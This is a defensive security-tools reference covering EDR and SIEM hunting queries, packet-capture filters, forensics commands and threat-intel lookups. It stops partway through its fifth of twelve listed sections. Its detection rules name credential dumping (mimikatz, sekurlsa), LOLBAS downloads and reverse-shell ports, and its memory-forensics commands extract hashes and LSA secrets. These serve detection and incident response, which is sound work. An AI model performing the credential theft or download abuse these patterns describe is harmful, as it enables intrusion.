# 14 - Tools Reference
## Security Tools, Commands, Query Languages, Detection Rules

---

## Table of Contents
1. [EDR/XDR Platforms](#edrxdr-platforms)
2. [SIEM Platforms and Query Examples](#siem-platforms-and-query-examples)
3. [Network Analysis Tools](#network-analysis-tools)
4. [Forensics Tools](#forensics-tools)
5. [Threat Intelligence and OSINT](#threat-intelligence-and-osint)
6. [Vulnerability Scanning Tools](#vulnerability-scanning-tools)
7. [Penetration Testing Tools](#penetration-testing-tools)
8. [Cloud Security Tools](#cloud-security-tools)
9. [Detection Rule Formats](#detection-rule-formats)
10. [Quick Command Reference](#quick-command-reference)
11. [Log Locations Reference](#log-locations-reference)
12. [Interview Questions](#interview-questions---tools)

---

## EDR/XDR Platforms

### Platform Comparison

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                         EDR/XDR PLATFORM COMPARISON                         │
├─────────────────┬───────────────────────────────────────────────────────────┤
│ CROWDSTRIKE     │ Cloud-native, Falcon platform                            │
│ FALCON          │ Query: Falcon Query Language (FQL)                       │
│                 │ Strengths: Threat intel, lightweight agent               │
│                 │ Key modules: Falcon Prevent, Insight, OverWatch          │
├─────────────────┼───────────────────────────────────────────────────────────┤
│ MICROSOFT       │ Integrated with M365 E5, Azure ecosystem                 │
│ DEFENDER        │ Query: KQL (Kusto Query Language)                        │
│                 │ Strengths: Native Windows integration, Sentinel          │
│                 │ Key features: ASR rules, AIR, Attack Simulator           │
├─────────────────┼───────────────────────────────────────────────────────────┤
│ SENTINELONE     │ AI-driven, Singularity platform                          │
│                 │ Query: Deep Visibility (SQL-like)                        │
│                 │ Strengths: Ransomware rollback, storyline                │
│                 │ Key features: ActiveEDR, Ranger, Vigilance               │
├─────────────────┼───────────────────────────────────────────────────────────┤
│ VMWARE CARBON   │ Behavioral EDR, cloud workload protection                │
│ BLACK           │ Query: CB Query Language                                 │
│                 │ Strengths: Process tree visualization                    │
│                 │ Key features: Cb Defense, Cb Response                    │
├─────────────────┼───────────────────────────────────────────────────────────┤
│ PALO ALTO       │ Network + endpoint correlation, XDR                      │
│ CORTEX XDR      │ Query: XQL (Cortex Query Language)                       │
│                 │ Strengths: NGFW integration, Unit 42 intel               │
│                 │ Key features: Analytics, XSOAR integration               │
└─────────────────┴───────────────────────────────────────────────────────────┘
```

### CrowdStrike Falcon Query Language (FQL)

```
BASIC SYNTAX:
field:value                    # Exact match
field:*partial*                # Wildcard
field:[start TO end]           # Range
field>value                    # Comparison
field1:value field2:value      # AND (implicit)
field1:value, field2:value     # OR

PROCESS QUERIES:
# Find PowerShell execution
ProcessName:powershell.exe

# PowerShell with encoded command
ProcessName:powershell.exe CommandLine:*-enc*

# Process spawned from Office
ParentProcessName:WINWORD.EXE

# Suspicious process from temp
ProcessPath:*\\Temp\\*

# Process with network connection
ProcessName:* HasNetworkConnection:true

DETECTION QUERIES:
# Mimikatz indicators
CommandLine:*sekurlsa* OR CommandLine:*logonpasswords*

# Living off the land
ProcessName:(certutil.exe OR bitsadmin.exe OR mshta.exe)

# Lateral movement via PsExec
ProcessName:psexec.exe OR ProcessName:psexesvc.exe

# Scheduled task creation
CommandLine:*schtasks* CommandLine:*/create*

FILE QUERIES:
# Executables in user directories
FileName:*.exe FilePath:*\\Users\\*

# Recently modified DLLs
FileType:DLL ModifiedTime:[2024-01-01 TO *]

NETWORK QUERIES:
# Connections to suspicious ports
RemotePort:(4444 OR 5555 OR 8080) NOT RemoteIP:10.*

# DNS queries for suspicious domains
DomainName:*.xyz OR DomainName:*duckdns*

# Large outbound transfers
BytesSent>10000000
```

### Microsoft Defender KQL Queries

```
PROCESS EXECUTION:
// PowerShell with encoded commands
DeviceProcessEvents
| where ProcessCommandLine has_any ("-enc", "-encoded", "-e ")
| where FileName =~ "powershell.exe"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine

// Office spawning suspicious child
DeviceProcessEvents
| where InitiatingProcessFileName in~ ("winword.exe", "excel.exe", "outlook.exe")
| where FileName in~ ("cmd.exe", "powershell.exe", "wscript.exe", "mshta.exe")

// Process injection indicators
DeviceProcessEvents
| where ProcessCommandLine has_any ("VirtualAlloc", "WriteProcessMemory",
    "CreateRemoteThread", "NtQueueApcThread")

// LOLBAS execution
DeviceProcessEvents
| where FileName in~ ("certutil.exe", "bitsadmin.exe", "regsvr32.exe",
    "mshta.exe", "rundll32.exe", "wmic.exe")
| where ProcessCommandLine has_any ("http://", "https://", "/download",
    "-decode", "scrobj")

NETWORK ACTIVITY:
// Outbound to rare destinations
DeviceNetworkEvents
| where RemotePort in (4444, 5555, 8080, 1234)
| where RemoteIPType == "Public"
| summarize ConnectionCount=count() by RemoteIP, RemotePort, DeviceName

// DNS to new domains
DeviceNetworkEvents
| where ActionType == "DnsQuery"
| where Timestamp > ago(24h)
| summarize by RemoteUrl
| join kind=leftanti (
    DeviceNetworkEvents
    | where Timestamp between (ago(30d) .. ago(24h))
    | summarize by RemoteUrl
) on RemoteUrl

// Beacon-like patterns (regular interval connections)
DeviceNetworkEvents
| where RemoteIPType == "Public"
| summarize Connections=make_list(Timestamp) by DeviceName, RemoteIP
| extend Intervals = array_sort_asc(Connections)
| mv-apply Interval = Intervals to typeof(datetime) on (
    extend NextInterval = next(Interval)
    | extend Gap = datetime_diff('second', NextInterval, Interval)
)
| summarize AvgGap=avg(Gap), StdDev=stdev(Gap), Count=count() by DeviceName, RemoteIP
| where Count > 10 and StdDev < 60  // Regular intervals

FILE ACTIVITY:
// Files written to startup folders
DeviceFileEvents
| where FolderPath has_any ("\\Startup\\", "\\Start Menu\\")
| where ActionType == "FileCreated"

// Executables in temp directories
DeviceFileEvents
| where FolderPath has "\\Temp\\"
| where FileName endswith ".exe" or FileName endswith ".dll"

REGISTRY:
// Persistence via Run keys
DeviceRegistryEvents
| where RegistryKey has_any ("\\Run", "\\RunOnce")
| where ActionType == "RegistryValueSet"

// Security tool tampering
DeviceRegistryEvents
| where RegistryKey has "Windows Defender"
| where RegistryValueName has_any ("DisableAntiSpyware", "DisableRealtimeMonitoring")

IDENTITY:
// Brute force detection
IdentityLogonEvents
| where LogonType == "Network"
| where ActionType == "LogonFailed"
| summarize FailedAttempts=count() by AccountName, DeviceName, bin(Timestamp, 5m)
| where FailedAttempts > 10

// Lateral movement patterns
IdentityLogonEvents
| where LogonType == "RemoteInteractive"
| summarize TargetMachines=dcount(DeviceName) by AccountName, bin(Timestamp, 1h)
| where TargetMachines > 5

ADVANCED HUNTING:
// Full attack chain correlation
let SuspiciousProcesses = DeviceProcessEvents
| where Timestamp > ago(1h)
| where FileName =~ "powershell.exe" and ProcessCommandLine has "-enc";
let NetworkConnections = DeviceNetworkEvents
| where Timestamp > ago(1h)
| where RemoteIPType == "Public";
SuspiciousProcesses
| join kind=inner (NetworkConnections) on DeviceId
| where NetworkConnections.Timestamp between
    (SuspiciousProcesses.Timestamp .. (SuspiciousProcesses.Timestamp + 5m))
```

### SentinelOne Deep Visibility

```
BASIC SYNTAX:
field = "value"
field IN ("val1", "val2")
field CONTAINS "partial"
field LIKE "pattern%"
field BETWEEN "start" AND "end"

PROCESS QUERIES:
-- PowerShell with download
ProcessName = "powershell.exe"
AND ProcessCmd CONTAINS "downloadstring"

-- Process from unusual location
ProcessPath LIKE "%\\AppData\\Local\\Temp\\%"
AND ProcessName LIKE "%.exe"

-- Suspicious parent-child
ParentProcessName = "winword.exe"
AND ProcessName IN ("cmd.exe", "powershell.exe", "wscript.exe")

NETWORK QUERIES:
-- External connections on non-standard ports
DstPort NOT IN (80, 443, 53, 25)
AND DstIP NOT LIKE "10.%"
AND DstIP NOT LIKE "192.168.%"

-- DNS queries to suspicious TLDs
DNSRequest LIKE "%.xyz"
OR DNSRequest LIKE "%.tk"
OR DNSRequest LIKE "%.top"

FILE QUERIES:
-- Files created in startup
FilePath LIKE "%\\Startup\\%"
AND EventType = "File Creation"

-- Executable dropped and run
EventType = "File Creation"
AND FilePath LIKE "%.exe"
```

### Carbon Black Query Language

```
PROCESS QUERIES:
# Find processes by name
process_name:powershell.exe

# Command line contains
cmdline:*-encodedcommand*

# Parent process relationship
parent_name:winword.exe process_name:cmd.exe

# Process path
path:*\\temp\\*

# Network connections
has_netconn:true process_name:powershell.exe

# Module loads
modload:suspicious.dll

COMBINED QUERIES:
# Suspicious Office child process with network
parent_name:(winword.exe OR excel.exe) AND
process_name:(cmd.exe OR powershell.exe) AND
has_netconn:true

# Process from user temp with network
path:*\\users\\*\\appdata\\local\\temp\\* AND
has_netconn:true

# Credential access patterns
cmdline:*mimikatz* OR cmdline:*sekurlsa* OR cmdline:*logonpasswords*
```

### Cortex XDR (XQL)

```
BASIC SYNTAX:
dataset = xdr_data
| filter field = "value"
| fields field1, field2
| sort desc timestamp

PROCESS QUERIES:
// PowerShell encoded execution
dataset = xdr_data
| filter event_type = PROCESS
| filter action_process_image_name = "powershell.exe"
| filter action_process_command_line contains "-enc"

// LOLBAS with network
dataset = xdr_data
| filter event_type = PROCESS
| filter action_process_image_name in ("certutil.exe", "bitsadmin.exe")
| join (
    dataset = xdr_data
    | filter event_type = NETWORK
) as network on action_process_instance_id = network.action_process_instance_id

// Lateral movement detection
dataset = xdr_data
| filter event_type = NETWORK
| filter dst_port in (445, 135, 3389, 5985)
| filter dst_ip != src_ip
| comp count() as connection_count by src_host_host_name, dst_ip
| filter connection_count > 5

FILE QUERIES:
// Files in startup
dataset = xdr_data
| filter event_type = FILE
| filter action_file_path contains "\\Startup\\"
```

---

## SIEM Platforms and Query Examples

### Splunk SPL (Search Processing Language)

```
BASIC SEARCH:
index=windows EventCode=4624
| stats count by TargetUserName, LogonType
| sort -count

TIME COMMANDS:
earliest=-24h latest=now
| timechart span=1h count by EventCode

STATISTICAL ANALYSIS:
| stats count, avg(field), sum(field), dc(field) by group_field
| eventstats avg(count) as avg_count
| where count > avg_count * 2

JOINS AND LOOKUPS:
| lookup threat_intel ip as src_ip OUTPUT threat_type, confidence
| join type=inner src_ip [search index=threat_intel | fields ip, threat_name]

SUBSEARCH:
index=main [search index=threat_intel | fields ip | rename ip as src_ip]

TRANSACTION:
| transaction src_ip maxspan=1h startswith="login" endswith="logout"

SECURITY USE CASES:

# Brute force detection
index=windows EventCode=4625
| stats count by TargetUserName, IpAddress, _time span=5m
| where count > 10
| stats values(IpAddress) as attacking_ips, sum(count) as total_failures by TargetUserName

# PowerShell encoded commands
index=windows EventCode=4104 OR EventCode=4103
| search ScriptBlockText="*-enc*" OR ScriptBlockText="*FromBase64*"
| table _time, ComputerName, UserName, ScriptBlockText

# Lateral movement via WMI
index=windows EventCode=4648 OR EventCode=4624
| where LogonType=3 AND AuthenticationPackageName="NTLM"
| stats count by TargetUserName, IpAddress
| where count > 5

# Suspicious service creation
index=windows EventCode=7045
| search ServiceName!="Windows*"
| table _time, ComputerName, ServiceName, ImagePath, ServiceType

# Data exfiltration detection
index=proxy
| stats sum(bytes_out) as total_bytes by src_ip, dest_domain
| where total_bytes > 100000000
| lookup internal_assets ip as src_ip OUTPUT department, user

# DNS tunneling detection
index=dns
| stats count, avg(query_length) as avg_len by src_ip
| where avg_len > 50 AND count > 100

# Beacon detection (regular interval connections)
index=proxy
| sort 0 src_ip, _time
| streamstats current=f last(_time) as prev_time by src_ip
| eval interval = _time - prev_time
| stats stdev(interval) as interval_stdev, avg(interval) as interval_avg,
    count by src_ip, dest_ip
| where interval_stdev < 60 AND count > 50

# Living off the land binaries
index=sysmon EventCode=1
| search (Image="*\\certutil.exe" OR Image="*\\bitsadmin.exe"
    OR Image="*\\mshta.exe" OR Image="*\\regsvr32.exe")
| search CommandLine="*http*" OR CommandLine="*download*"
| table _time, ComputerName, User, Image, CommandLine, ParentImage

MACROS AND SAVED SEARCHES:
# Define macro: `suspicious_parents`
(ParentImage="*\\winword.exe" OR ParentImage="*\\excel.exe"
    OR ParentImage="*\\outlook.exe")

# Use macro
index=sysmon EventCode=1 `suspicious_parents`
| search Image="*\\cmd.exe" OR Image="*\\powershell.exe"
```

### Microsoft Sentinel KQL

```
BASIC QUERIES:
SecurityEvent
| where EventID == 4624
| summarize count() by TargetAccount, LogonType
| order by count_ desc

TIME FILTERING:
| where TimeGenerated > ago(24h)
| where TimeGenerated between (datetime(2024-01-01) .. datetime(2024-01-31))

AGGREGATION:
| summarize
    TotalEvents = count(),
    UniqueUsers = dcount(TargetAccount),
    FirstSeen = min(TimeGenerated),
    LastSeen = max(TimeGenerated)
    by Computer
| where TotalEvents > 100

JOINS:
SecurityEvent
| where EventID == 4624
| join kind=inner (
    Heartbeat
    | summarize arg_max(TimeGenerated, *) by Computer
) on Computer

ADVANCED ANALYTICS:

// Anomalous login times
let baseline = SigninLogs
| where TimeGenerated between (ago(30d) .. ago(1d))
| extend Hour = hourofday(TimeGenerated)
| summarize NormalHours = make_set(Hour) by UserPrincipalName;
SigninLogs
| where TimeGenerated > ago(24h)
| extend Hour = hourofday(TimeGenerated)
| join kind=leftouter (baseline) on UserPrincipalName
| where Hour !in (NormalHours)

// Rare process execution
DeviceProcessEvents
| where TimeGenerated > ago(24h)
| summarize ExecutionCount = count() by FileName, FolderPath
| where ExecutionCount < 5
| join kind=inner (
    DeviceProcessEvents | where TimeGenerated > ago(24h)
) on FileName
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine

// Impossible travel
SigninLogs
| where ResultType == 0
| extend City = tostring(LocationDetails.city)
| extend Country = tostring(LocationDetails.countryOrRegion)
| order by UserPrincipalName, TimeGenerated
| serialize
| extend PreviousCity = prev(City, 1), PreviousTime = prev(TimeGenerated, 1),
    PreviousUser = prev(UserPrincipalName, 1)
| where UserPrincipalName == PreviousUser
| extend TimeDiff = datetime_diff('hour', TimeGenerated, PreviousTime)
| where City != PreviousCity and TimeDiff < 2

// Threat hunting - Cobalt Strike beacon
DeviceNetworkEvents
| where TimeGenerated > ago(24h)
| where RemotePort in (80, 443)
| summarize
    Connections = count(),
    Timestamps = make_list(TimeGenerated)
    by DeviceName, RemoteIP
| where Connections > 50
| extend SortedTimestamps = array_sort_asc(Timestamps)
| mv-apply ts = SortedTimestamps to typeof(datetime) on (
    extend NextTs = next(ts)
    | extend Interval = datetime_diff('second', NextTs, ts)
)
| summarize AvgInterval = avg(Interval), StdDev = stdev(Interval) by DeviceName, RemoteIP
| where StdDev < 10 and AvgInterval between (30 .. 120)

// Persistence mechanisms
union (
    DeviceRegistryEvents
    | where RegistryKey has_any ("Run", "RunOnce", "Services")
    | where ActionType == "RegistryValueSet"
    | extend PersistenceType = "Registry"
),
(
    DeviceFileEvents
    | where FolderPath has_any ("Startup", "Start Menu")
    | where ActionType == "FileCreated"
    | extend PersistenceType = "Startup Folder"
),
(
    DeviceEvents
    | where ActionType == "ScheduledTaskCreated"
    | extend PersistenceType = "Scheduled Task"
)
| project TimeGenerated, DeviceName, PersistenceType, FileName, FolderPath

ANALYTIC RULES:
// Create scheduled alert
SecurityEvent
| where EventID == 4625
| summarize FailureCount = count() by TargetAccount, IpAddress, bin(TimeGenerated, 5m)
| where FailureCount > 10
```

### Elastic (EQL and KQL)

```
EQL (Event Query Language):

// Process with network activity (sequence)
sequence by host.name with maxspan=5m
  [process where event.type == "start" and process.name == "powershell.exe"]
  [network where destination.port == 443]

// Suspicious parent-child
process where event.type == "start" and
  process.parent.name == "winword.exe" and
  process.name in ("cmd.exe", "powershell.exe", "wscript.exe")

// File written and executed
sequence by host.name with maxspan=1m
  [file where event.type == "creation" and file.extension == "exe"]
  [process where event.type == "start"]

// Persistence via registry
registry where registry.path : "*\\Run\\*" and
  event.type == "change"

// Lateral movement sequence
sequence by user.name with maxspan=1h
  [authentication where event.outcome == "success"]
  [process where process.name == "psexec.exe"]

// Living off the land
process where process.name in ("certutil.exe", "bitsadmin.exe", "mshta.exe") and
  process.args : ("*http*", "*download*", "*decode*")

Elasticsearch KQL:

// Basic search
event.category: "process" AND process.name: "powershell.exe"

// Command line analysis
process.command_line: *downloadstring* OR process.command_line: *invoke-expression*

// Network connections
event.category: "network" AND destination.port: (4444 OR 5555 OR 8080)

// File creation in temp
event.category: "file" AND file.path: *\\Temp\\*.exe

// With aggregations (in Kibana)
{
  "aggs": {
    "processes_by_user": {
      "terms": { "field": "user.name" },
      "aggs": {
        "rare_processes": {
          "rare_terms": { "field": "process.name" }
        }
      }
    }
  }
}

Lucene Query:
// Wildcards and boolean
process.name:powershell* AND NOT user.name:SYSTEM

// Range queries
event.timestamp:[2024-01-01 TO 2024-01-31]

// Proximity search
message:"error password"~5
```

---

## Network Analysis Tools

### Wireshark/tshark

```
CAPTURE FILTERS (BPF):
# Host-based
host 192.168.1.1
src host 192.168.1.1
dst host 192.168.1.1

# Port-based
port 443
tcp port 80
udp port 53

# Network range
net 192.168.0.0/24

# Complex filters
host 192.168.1.1 and port 443
tcp port 80 and not host 10.0.0.1
(tcp port 80 or tcp port 443) and host 192.168.1.1

DISPLAY FILTERS:
# Protocol filters
http
dns
tls
tcp
udp
icmp

# IP filters
ip.addr == 192.168.1.1
ip.src == 192.168.1.1
ip.dst == 192.168.1.1
!ip.addr == 10.0.0.0/8

# Port filters
tcp.port == 443
tcp.dstport == 80
tcp.srcport == 4444
tcp.port in {80, 443, 8080}

# TCP flags
tcp.flags.syn == 1
tcp.flags.syn == 1 and tcp.flags.ack == 0    # SYN only
tcp.flags.rst == 1
tcp.flags.fin == 1

# HTTP
http.request.method == "POST"
http.request.method == "GET"
http.request.uri contains "admin"
http.host contains "evil"
http.response.code == 200
http.response.code >= 400

# DNS
dns.qry.name contains "evil"
dns.qry.type == 1    # A record
dns.qry.type == 28   # AAAA record
dns.flags.response == 0    # Queries only

# TLS/SSL
tls.handshake.type == 1    # Client Hello
tls.handshake.extensions_server_name contains "example"
ssl.record.content_type == 23    # Application data

# Content patterns
frame contains "password"
http.file_data contains "malware"
tcp contains "cmd.exe"

# Size filters
frame.len > 1000
tcp.len > 0
http.content_length > 10000

# Time-based
frame.time >= "Jan 1, 2024 00:00:00"

TSHARK EXAMPLES:
# Capture to file
tshark -i eth0 -w capture.pcap

# Read and filter
tshark -r capture.pcap -Y "http"

# Field extraction
tshark -r capture.pcap -Y "http" -T fields -e http.host -e http.request.uri

# DNS queries
tshark -r capture.pcap -Y "dns" -T fields -e dns.qry.name | sort | uniq -c | sort -rn

# HTTP requests
tshark -r capture.pcap -Y "http.request" -T fields -e ip.src -e http.host -e http.request.uri

# TLS server names (SNI)
tshark -r capture.pcap -Y "tls.handshake.extensions_server_name" \
    -T fields -e ip.dst -e tls.handshake.extensions_server_name

# Statistics
tshark -r capture.pcap -z conv,tcp    # TCP conversations
tshark -r capture.pcap -z endpoints,ip    # IP endpoints
tshark -r capture.pcap -z io,stat,60    # Packets per minute
tshark -r capture.pcap -z http,tree    # HTTP statistics

# Extract files
tshark -r capture.pcap --export-objects http,./extracted_files

# Follow TCP stream
tshark -r capture.pcap -z "follow,tcp,ascii,0"
```

### Zeek (formerly Bro)

```
LOG FILES:
conn.log        # Connection records (5-tuple, duration, bytes)
dns.log         # DNS queries and responses
http.log        # HTTP sessions
ssl.log         # SSL/TLS handshakes
files.log       # File analysis
notice.log      # Alerts and notices
weird.log       # Protocol anomalies
x509.log        # Certificate details
smtp.log        # Email sessions
ftp.log         # FTP sessions
ssh.log         # SSH connections
kerberos.log    # Kerberos authentication

ZEEK-CUT FIELD EXTRACTION:
# Connection summary
cat conn.log | zeek-cut id.orig_h id.resp_h id.resp_p proto duration \
    orig_bytes resp_bytes | head

# DNS queries
cat dns.log | zeek-cut query answers | sort | uniq -c | sort -rn

# HTTP hosts
cat http.log | zeek-cut host uri | sort | uniq -c | sort -rn

# SSL certificates
cat ssl.log | zeek-cut server_name issuer subject

# Large file transfers
cat conn.log | zeek-cut id.orig_h id.resp_h orig_bytes resp_bytes \
    | awk '$3 > 1000000 || $4 > 1000000'

# Long connections
cat conn.log | zeek-cut id.orig_h id.resp_h duration \
    | awk '$3 > 3600' | sort -t$'\t' -k3 -rn

THREAT HUNTING WITH ZEEK:
# Beaconing detection
cat conn.log | zeek-cut id.orig_h id.resp_h id.resp_p ts \
    | sort | uniq -c | awk '$1 > 100' | sort -rn

# DNS tunneling indicators
cat dns.log | zeek-cut query | awk 'length($1) > 50' | wc -l

# TOR connections (known exit nodes)
cat conn.log | zeek-cut id.resp_h id.resp_p \
    | grep -f tor_exit_nodes.txt

# JA3 fingerprinting (in ssl.log with JA3 script)
cat ssl.log | zeek-cut ja3 ja3s | sort | uniq -c | sort -rn

# Suspicious user agents
cat http.log | zeek-cut user_agent | sort | uniq -c | sort -rn | head

ZEEK SCRIPTS:
# Custom notice
@load base/frameworks/notice

event http_request(c: connection, method: string, original_URI: string,
                   unescaped_URI: string, version: string)
{
    if ( /\.exe$/ in unescaped_URI )
    {
        NOTICE([$note=HTTP::Suspicious_Download,
                $msg=fmt("EXE download: %s", unescaped_URI),
                $conn=c]);
    }
}
```

### tcpdump

```
CAPTURE:
# Basic capture
tcpdump -i eth0

# Capture to file
tcpdump -i eth0 -w capture.pcap

# Capture with timestamp
tcpdump -i eth0 -tttt

# Capture with full packet
tcpdump -i eth0 -s 0

# Capture specific count
tcpdump -i eth0 -c 100

READ AND ANALYZE:
# Read pcap file
tcpdump -r capture.pcap

# ASCII output
tcpdump -r capture.pcap -A

# Hex and ASCII
tcpdump -r capture.pcap -X

# Verbose output
tcpdump -r capture.pcap -v
tcpdump -r capture.pcap -vvv

FILTERS:
# By host
tcpdump host 192.168.1.1
tcpdump src host 192.168.1.1
tcpdump dst host 192.168.1.1

# By port
tcpdump port 80
tcpdump src port 443
tcpdump dst port 53

# By protocol
tcpdump tcp
tcpdump udp
tcpdump icmp

# By network
tcpdump net 192.168.0.0/24

# TCP flags
tcpdump 'tcp[tcpflags] & tcp-syn != 0'    # SYN packets
tcpdump 'tcp[tcpflags] & tcp-rst != 0'    # RST packets
tcpdump 'tcp[tcpflags] & (tcp-syn|tcp-fin) != 0'    # SYN or FIN

# Packet size
tcpdump 'len > 500'

# Combined filters
tcpdump 'port 80 and host 192.168.1.1'
tcpdump 'tcp port 443 and not host 10.0.0.1'
tcpdump '(tcp port 80 or tcp port 443) and host 192.168.1.1'

SECURITY USE CASES:
# DNS queries
tcpdump -n -i eth0 'udp port 53'

# HTTP traffic (unencrypted)
tcpdump -A -i eth0 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)'

# Potential port scan
tcpdump -n 'tcp[tcpflags] == tcp-syn'

# ICMP (ping, traceroute)
tcpdump -n 'icmp'

# SSH connections
tcpdump -n 'tcp port 22'

# SMB/Windows shares
tcpdump -n 'tcp port 445 or tcp port 139'
```

---

## Forensics Tools

### Disk Forensics

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                         DISK FORENSICS TOOLS                                │
├─────────────────┬───────────────────────────────────────────────────────────┤
│ Autopsy         │ Open source GUI, timeline analysis, keyword search        │
│ FTK Imager      │ Disk imaging, preview, hash verification                  │
│ EnCase          │ Commercial, enterprise forensics, court accepted          │
│ X-Ways          │ Commercial, fast indexing, advanced analysis              │
│ Sleuth Kit      │ CLI tools, foundation for Autopsy                         │
│ dc3dd/dcfldd    │ Forensic imaging with hashing                             │
│ Plaso/Log2timeline │ Super timeline creation from multiple artifacts        │
└─────────────────┴───────────────────────────────────────────────────────────┘

SLEUTH KIT COMMANDS:
# Image info
img_stat image.dd

# File system info
fsstat image.dd

# List files
fls -r image.dd

# Get file metadata
istat image.dd inode_number

# Extract file
icat image.dd inode_number > extracted_file

# Timeline generation
fls -r -m / image.dd > bodyfile.txt
mactime -b bodyfile.txt > timeline.csv

FTK IMAGER CLI:
# Create image
ftkimager \\.\PhysicalDrive0 output.E01 --e01 --compress 6 --verify

PLASO/LOG2TIMELINE:
# Parse image
log2timeline.py --storage-file timeline.plaso image.dd

# Output to CSV
psort.py -o l2tcsv timeline.plaso > timeline.csv

# Filter by date
psort.py -o l2tcsv --slice "2024-01-01T00:00:00,2024-01-31T23:59:59" \
    timeline.plaso > filtered_timeline.csv
```

### Memory Forensics

```
VOLATILITY 3 QUICK REFERENCE:

# System information
vol -f memory.raw windows.info

# Process listing
vol -f memory.raw windows.pslist
vol -f memory.raw windows.pstree
vol -f memory.raw windows.psscan

# Process details
vol -f memory.raw windows.cmdline
vol -f memory.raw windows.dlllist --pid 1234
vol -f memory.raw windows.handles --pid 1234
vol -f memory.raw windows.vadinfo --pid 1234

# Network connections
vol -f memory.raw windows.netstat
vol -f memory.raw windows.netscan

# Malware detection
vol -f memory.raw windows.malfind
vol -f memory.raw windows.hollowprocesses
vol -f memory.raw windows.ldrmodules

# Registry
vol -f memory.raw windows.registry.hivelist
vol -f memory.raw windows.registry.printkey --key "Software\\Microsoft\\Windows\\CurrentVersion\\Run"

# Files
vol -f memory.raw windows.filescan
vol -f memory.raw windows.dumpfiles --pid 1234

# Credentials
vol -f memory.raw windows.hashdump
vol -f memory.raw windows.lsadump
vol -f memory.raw windows.cachedump

# Services and drivers
vol -f memory.raw windows.svcscan
vol -f memory.raw windows.driverscan
vol -f memory.raw windows.modules

# Timeline
vol -f memory.raw timeliner.Timeliner

LINUX MEMORY:
vol -f memory.raw linux.pslist
vol -f memory.raw linux.pstree
vol -f memory.raw linux.bash
vol -f memory.raw linux.netstat
vol -f memory.raw linux.lsof

MEMORY ACQUISITION:
# Windows - WinPmem
winpmem_mini_x64.exe memory.raw

# Windows - DumpIt
DumpIt.exe

# Linux - LiME
insmod lime-kernel.ko "path=/tmp/memory.raw format=raw"

# macOS - osxpmem
sudo ./osxpmem -o memory.raw
```

### Artifact Parsers (Eric Zimmerman Tools)

```
KAPE (Kroll Artifact Parser):
# Collect artifacts
kape.exe --tsource C: --tdest D:\Output --target !BasicCollection

# Parse artifacts
kape.exe --msource D:\Output --mdest D:\Parsed --module !EZParser

MFTECmd (MFT Parser):
MFTECmd.exe -f "$MFT" --csv output_dir

PECmd (Prefetch):
PECmd.exe -f prefetch.pf
PECmd.exe -d C:\Windows\Prefetch --csv output_dir

LECmd (LNK Files):
LECmd.exe -f shortcut.lnk
LECmd.exe -d "C:\Users\*\Recent" --csv output_dir

JLECmd (Jump Lists):
JLECmd.exe -d "C:\Users\*\AppData\Roaming\Microsoft\Windows\Recent\AutomaticDestinations"

EvtxECmd (Event Logs):
EvtxECmd.exe -f Security.evtx --csv output_dir

RECmd (Registry):
RECmd.exe --bn BatchFile.reb -d "C:\Windows\System32\config" --csv output_dir

AmcacheParser:
AmcacheParser.exe -f Amcache.hve --csv output_dir

ShellBagsExplorer:
# GUI tool for analyzing shellbags (folder access history)

Timeline Explorer:
# GUI for viewing CSV/XLSX timeline output

HAYABUSA (Windows Event Log Analysis):
hayabusa csv-timeline -d ./evtx_files -o timeline.csv
hayabusa logon-summary -d ./evtx_files

CHAINSAW (Event Log Analysis):
chainsaw hunt ./evtx_files -s sigma_rules/ --mapping mappings/
chainsaw search ./evtx_files --string "mimikatz"
```

### Timeline Creation

```
SUPER TIMELINE WORKFLOW:

1. COLLECT ARTIFACTS:
   kape.exe --tsource E: --tdest F:\Collection --target !SANS_Triage

2. PARSE TO TIMELINE:
   log2timeline.py --storage-file F:\timeline.plaso F:\Collection

3. FILTER AND OUTPUT:
   psort.py -o l2tcsv -w F:\timeline.csv F:\timeline.plaso \
       "date > '2024-01-01T00:00:00' AND date < '2024-01-31T23:59:59'"

4. ANALYZE IN TIMELINE EXPLORER:
   Open timeline.csv in Timeline Explorer
   Filter, sort, and correlate events

KEY TIMESTAMP SOURCES:
├─ $MFT (file system timestamps)
├─ USN Journal (file changes)
├─ Prefetch (execution)
├─ Event logs (system activity)
├─ Registry (settings changes)
├─ Browser history (web activity)
├─ LNK files (file access)
├─ Jump Lists (file access)
├─ Shellbags (folder navigation)
└─ AmCache (program execution)
```

---

## Threat Intelligence and OSINT

### Platforms and Tools

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                      THREAT INTELLIGENCE PLATFORMS                          │
├─────────────────┬───────────────────────────────────────────────────────────┤
│ VirusTotal      │ File/URL/IP analysis, 70+ AV engines, community intel    │
│ Shodan          │ Internet-connected device search engine                   │
│ Censys          │ Internet scan data, certificate transparency              │
│ GreyNoise       │ Internet background noise vs targeted activity            │
│ URLScan.io      │ URL sandbox, DOM analysis, screenshot                     │
│ AlienVault OTX  │ Open threat exchange, community IOCs                      │
│ MISP            │ Open source threat intelligence platform                  │
│ Recorded Future │ Commercial, predictive intelligence                       │
│ Mandiant        │ Commercial, incident response intel                       │
│ ThreatFox       │ IOC database by abuse.ch                                  │
│ MalwareBazaar   │ Malware sample repository                                 │
│ Any.Run         │ Interactive malware sandbox                               │
│ Joe Sandbox     │ Deep malware analysis                                     │
│ Hybrid Analysis │ Free malware sandbox by CrowdStrike                       │
└─────────────────┴───────────────────────────────────────────────────────────┘

CLI TOOLS:

# VirusTotal CLI
vt file <hash>
vt url <url>
vt domain <domain>
vt ip <ip_address>
vt search "positives:5+ type:peexe"

# Shodan CLI
shodan init <API_KEY>
shodan search "port:3389 country:US"
shodan host 1.2.3.4
shodan stats "apache country:US"
shodan download results "port:22"

# AbuseIPDB
curl -s "https://api.abuseipdb.com/api/v2/check" \
    -G -d "ipAddress=1.2.3.4" \
    -H "Key: $API_KEY" | jq

# IPInfo
curl ipinfo.io/1.2.3.4?token=$TOKEN

# GreyNoise
curl -s "https://api.greynoise.io/v3/community/1.2.3.4" \
    -H "key: $API_KEY" | jq

# URLScan API
curl -s "https://urlscan.io/api/v1/search/?q=domain:example.com" | jq

OSINT TOOLS:
├─ TheHarvester (email, subdomain enumeration)
├─ Maltego (visual link analysis)
├─ Recon-ng (OSINT framework)
├─ SpiderFoot (automated OSINT)
├─ Amass (subdomain enumeration)
